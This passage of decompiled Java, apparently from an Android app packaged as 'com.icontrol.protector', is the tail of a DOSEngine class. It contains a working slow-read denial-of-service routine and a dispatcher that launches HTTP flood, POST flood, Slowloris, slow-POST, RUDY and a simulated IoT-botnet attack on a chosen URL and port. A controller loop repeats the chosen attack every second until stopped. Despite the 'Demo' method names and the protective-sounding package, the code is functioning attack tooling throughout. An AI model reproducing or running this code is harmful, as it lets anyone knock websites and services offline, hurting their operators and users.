                object3 = REFERERS[((ThreadLocalRandom)object3).nextInt(REFERERS.length)];
                StringBuilder stringBuilder = new StringBuilder();
                ((Writer)closeable).write(stringBuilder.append("GET ").append((String)object2).append(" HTTP/1.1\r\n").toString());
                object2 = new StringBuilder();
                ((Writer)closeable).write(((StringBuilder)object2).append("Host: ").append(((URL)object).getHost()).append("\r\n").toString());
                object = new StringBuilder();
                ((Writer)closeable).write(((StringBuilder)object).append("User-Agent: ").append(string2).append("\r\n").toString());
                object = new StringBuilder();
                ((Writer)closeable).write(((StringBuilder)object).append("Accept: ").append(string3).append("\r\n").toString());
                object = new StringBuilder();
                ((Writer)closeable).write(((StringBuilder)object).append("Accept-Language: ").append((String)charSequence).append("\r\n").toString());
                ((Writer)closeable).write("Accept-Encoding: gzip, deflate\r\n");
                object = new StringBuilder();
                ((Writer)closeable).write(((StringBuilder)object).append("Referer: ").append((String)object3).append("\r\n").toString());
                ((Writer)closeable).write("Connection: close\r\n\r\n");
                ((BufferedWriter)closeable).flush();
                object3 = socket.getInputStream();
                object2 = new byte[2];
                object = closeable;
                for (n = 0; (n2 = ((InputStream)object3).read((byte[])object2)) != -1 && this.running && n < 10000; ++n) {
                    closeable = System.out;
                    charSequence = new StringBuilder();
                    ((PrintStream)closeable).println(((StringBuilder)charSequence).append("[SLOWREAD_BYTES] ").append(n2).toString());
                    try {
                        Thread.sleep(3500L);
                        continue;
                    }
                    catch (InterruptedException interruptedException) {
                        // empty catch block
                        break;
                    }
                }
            }
            catch (Exception exception) {
                break block10;
            }
            {
                socket.close();
                System.out.println("[SLOWREAD_END]");
                return;
            }
        }
        System.out.println("[SLOWREAD_ERR] " + var1_5.getMessage());
    }

    /* synthetic */ void lambda$StartWork$1$com-icontrol-protector-DOSEngine(URL uRL, int n) {
        this.httpFlood(uRL, n);
    }

    /* synthetic */ void lambda$StartWork$2$com-icontrol-protector-DOSEngine(URL uRL, int n) {
        this.httpPostFlood(uRL, n);
    }

    /* synthetic */ void lambda$StartWork$3$com-icontrol-protector-DOSEngine(URL uRL, int n) {
        this.slowLorisDemo(uRL, n);
    }

    /* synthetic */ void lambda$StartWork$4$com-icontrol-protector-DOSEngine(URL uRL, int n) {
        this.slowPostDemo(uRL, n);
    }

    /* synthetic */ void lambda$StartWork$5$com-icontrol-protector-DOSEngine(URL uRL, int n) {
        this.slowReadDemo(uRL, n);
    }

    /* synthetic */ void lambda$StartWork$6$com-icontrol-protector-DOSEngine(URL uRL, int n) {
        this.rudyDemo(uRL, n);
    }

    /* synthetic */ void lambda$StartWork$7$com-icontrol-protector-DOSEngine(URL uRL, int n) {
        this.iotBotnetDemo(uRL, n);
    }

    /* synthetic */ void lambda$iotBotnetDemo$8$com-icontrol-protector-DOSEngine(int n, URL uRL, int n2) {
        System.out.println("[IOT_BOT] " + n + " start");
        this.httpFlood(uRL, n2);
        System.out.println("[IOT_BOT] " + n + " end");
    }

    /* synthetic */ void lambda$start$0$com-icontrol-protector-DOSEngine(String string2, String string3, String string4) {
        while (this.running) {
            scannerDate = System.currentTimeMillis();
            try {
                URL uRL = new URL(string2);
                this.StartWork(string3, uRL, Integer.valueOf(string4));
            }
            catch (Exception exception) {
                System.out.println("[ERROR] Invalid URL: " + exception.getMessage());
            }
            try {
                Thread.sleep(1000L);
            }
            catch (InterruptedException interruptedException) {
                this.running = false;
            }
        }
    }

    public void start(String string2, String string3, String string4) {
        if (this.running) {
            return;
        }
        String string5 = string3;
        if (!string3.startsWith("http://")) {
            string5 = string3;
            if (!string3.startsWith("https://")) {
                string5 = "http://" + string3;
            }
        }
        this.running = true;
        CurrentTarget = string5 + ":" + string4;
        this.scannerThread = new Thread(new DOSEngine$$ExternalSyntheticLambda8(this, string5, string2, string4));
        this.scannerThread.start();
    }

    public void stop() {
        scannerDate = 0L;
        CurrentTarget = "N/A";
        Activetype = "N/A";
        this.running = false;
        if (this.scannerThread != null) {
            this.scannerThread.interrupt();
        }
    }
}

